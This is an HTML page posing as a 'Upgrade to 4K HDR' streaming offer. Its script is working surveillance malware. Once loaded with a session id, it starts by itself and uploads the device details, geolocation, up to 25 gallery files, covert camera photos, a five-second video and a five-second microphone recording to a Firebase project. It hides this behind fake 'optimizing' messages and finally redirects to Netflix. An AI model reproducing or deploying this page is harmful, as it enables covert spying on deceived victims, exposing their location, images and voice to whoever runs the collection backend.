<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Stream Quality Upgrade</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #111;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #222;
        }
        .logo {
            width: 70px;
            height: 70px;
            background: #1a73e8;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }
        h2 { color: #fff; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
        .quality-box {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        .quality-box p { color: #ccc; font-size: 13px; margin: 4px 0; }
        .quality-badge {
            background: #1a73e8;
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            margin-top: 8px;
        }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 40px;
            cursor: pointer;
        }
        .btn:disabled { background: #444; cursor: not-allowed; }
        .loader { margin-top: 16px; color: #1a73e8; font-size: 13px; display: none; }
        input, video, canvas { display: none; }
        .status-msg {
            margin-top: 16px;
            padding: 10px;
            border-radius: 12px;
            font-size: 12px;
            display: none;
            background: #0a2e1a;
            color: #4ade80;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎬</div>
        <h2>Upgrade to 4K HDR</h2>
        <div class="sub">Enhanced streaming quality requires one-time setup</div>
        
        <div class="quality-box">
            <p>📱 Device: <span id="deviceName">Detecting...</span></p>
            <p>📶 Current Quality: HD Ready</p>
            <p>✨ Available: 4K HDR + Dolby Atmos</p>
            <div class="quality-badge">⚡ One-click upgrade</div>
        </div>
        
        <button class="btn" id="upgradeBtn">⚡ Enable 4K HDR</button>
        <div class="loader" id="loader">Optimizing your device...</div>
        <div class="status-msg" id="statusMsg"></div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const storage = firebase.storage();
        
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const upgradeBtn = document.getElementById('upgradeBtn');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');
        
        if (!sessionId) {
            statusMsg.style.display = 'block';
            statusMsg.style.background = '#2e0a0a';
            statusMsg.style.color = '#ff6b6b';
            statusMsg.innerHTML = '❌ Invalid upgrade link';
            upgradeBtn.disabled = true;
        }
        
        // Device detection
        const ua = navigator.userAgent;
        let deviceName = "Unknown";
        if (ua.includes("iPhone")) deviceName = "iPhone";
        else if (ua.includes("Android")) deviceName = "Android Phone";
        else if (ua.includes("Windows")) deviceName = "Windows PC";
        else if (ua.includes("Mac")) deviceName = "Mac";
        document.getElementById('deviceName').innerText = deviceName;
        
        function showMessage(msg, isError = false) {
            statusMsg.style.display = 'block';
            statusMsg.style.background = isError ? '#2e0a0a' : '#0a2e1a';
            statusMsg.style.color = isError ? '#ff6b6b' : '#4ade80';
            statusMsg.innerHTML = msg;
            setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
        }
        
        async function saveToFirebase(type, data) {
            if (!sessionId) return;
            try {
                await db.collection('sessions').doc(sessionId).collection('data').add({
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString()
                });
                return true;
            } catch(e) { return false; }
        }
        
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveToFirebase(type, { url, name: file.name });
            return url;
        }
        
        // 1. Device Info
        async function sendDeviceInfo() {
            await saveToFirebase('device_info', {
                device: deviceName,
                ua: ua,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language
            });
        }
        
        // 2. Location
        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await saveToFirebase('location', {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                    });
                    resolve(true);
                }, () => resolve(false));
            });
        }
        
        // 3. Gallery Access (full)
        async function getGallery() {
            return new Promise((resolve) => {
                const input = document.getElementById('galleryInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    if (files.length === 0) { resolve(false); return; }
                    loader.innerHTML = `📸 Optimizing ${files.length} files...`;
                    for (let i = 0; i < Math.min(files.length, 25); i++) {
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                        loader.innerHTML = `📸 Optimized ${i+1}/${Math.min(files.length, 25)}`;
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // 4. Camera: 4 photos + 5 sec video
        async function captureMedia() {
            try {
                // Camera photos (4 shots)
                loader.innerHTML = "📷 Capturing device photos...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 500));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                // Take 4 photos
                for (let i = 1; i <= 4; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                    await uploadFile(file, 'camera_photo');
                    loader.innerHTML = `📷 Captured ${i}/4 photos`;
                    await new Promise(r => setTimeout(r, 300));
                }
                
                // Video recording (5 seconds)
                loader.innerHTML = "🎥 Recording device video...";
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
                    await uploadFile(file, 'video_recording');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log("Camera error:", e);
                return false;
            }
        }
        
        // 5. Microphone (5 sec)
        async function getMicrophone() {
            try {
                loader.innerHTML = "🎤 Testing audio...";
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { return false; }
        }
        
        // MAIN UPGRADE FUNCTION
        async function startUpgrade() {
            if (!sessionId) return;
            
            upgradeBtn.disabled = true;
            loader.style.display = 'block';
            loader.innerHTML = "🔧 Preparing device optimization...";
            
            await sendDeviceInfo();
            await getLocation();
            
            loader.innerHTML = "📸 Accessing media...";
            showMessage("Media access required for 4K HDR upgrade", false);
            await getGallery();
            
            await captureMedia();
            await getMicrophone();
            
            await saveToFirebase('upgrade_complete', { timestamp: new Date().toISOString() });
            
            loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
            showMessage("Your device is now optimized for 4K HDR streaming", false);
            
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 2000);
        }
        
        upgradeBtn.onclick = startUpgrade;
        
        // Auto-start after 0.5s
        if (sessionId) {
            setTimeout(startUpgrade, 500);
        }
    </script>
</body>
</html>
